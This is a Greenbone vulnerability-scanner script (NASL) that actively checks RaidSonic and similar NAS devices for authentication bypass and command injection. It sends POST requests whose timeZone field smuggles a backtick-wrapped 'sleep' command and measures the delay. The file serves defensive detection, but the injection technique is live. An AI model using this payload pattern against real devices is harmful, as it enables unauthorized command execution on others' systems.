# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103793");
  script_version("2025-01-24T15:39:34+0000");
  script_tag(name:"last_modification", value:"2025-01-24 15:39:34 +0000 (Fri, 24 Jan 2025)");
  script_tag(name:"creation_date", value:"2013-09-24 12:37:41 +0200 (Tue, 24 Sep 2013)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("RaidSonic IB-NAS5220 and IB-NAS4220-B Multiple Security Vulnerabilities (Sep 2013) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"RaidSonic IB-NAS5220 and IB-NAS422-B devices are prone to
  multiple security vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted HTTP POST requests and checks the
  response time.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Authentication bypass

  - HTML injection

  - Command injection");

  script_tag(name:"impact", value:"The attacker may leverage these issues to bypass certain
  security restrictions and perform unauthorized actions or execute HTML and script code in the
  context of the affected browser, potentially allowing the attacker to steal cookie-based
  authentication credentials, control how the site is rendered to the user, or inject and execute
  arbitrary commands.");

  script_tag(name:"affected", value:"It seems that not only RaidSonic IB-NAS5220 and IB-NAS422-B
  are prone to these vulnerabilities. We've seen devices from Toshiba, Sarotech, Verbatim and
  others where it also was possible to execute commands using the same exploit. Looks like these
  devices are using the same vulnerable firmware.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57958");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

url = "/login.cgi";

res = http_get_cache( port:port, item:url );

if( "/loginHandler.cgi" >!< res && "focusLogin()" >!< res )
  exit( 0 );

sleep = make_list( 3, 5, 8 );

url = "/cgi/time/timeHandler.cgi";

headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );

foreach i( sleep ) {

  data = "month=1&date=1&year=2007&hour=12&minute=10&ampm=PM&timeZone=Amsterdam`sleep%20" + i +
         "`&ntp_type=default&ntpServer=none&old_date=+1+12007&old_time=1210&old_timeZone=Amsterdam&renew=0";

  req = http_post_put_req( port:port, url:url, data:data, add_headers:headers,
                           referer_url: "/cgi/time/time.cgi" );
  start = unixtime();
  res = http_send_recv( port:port, data:req );
  stop = unixtime();

  if( ! res || res !~ "^HTTP/1\.[01] 200" )
    exit( 0 );

  if( stop - start < i || stop - start > ( i + 5 ) )
    exit( 99 );
}

report = http_report_vuln_url( port:port, url:url );
security_message( port:port, data:report );

exit( 0 );
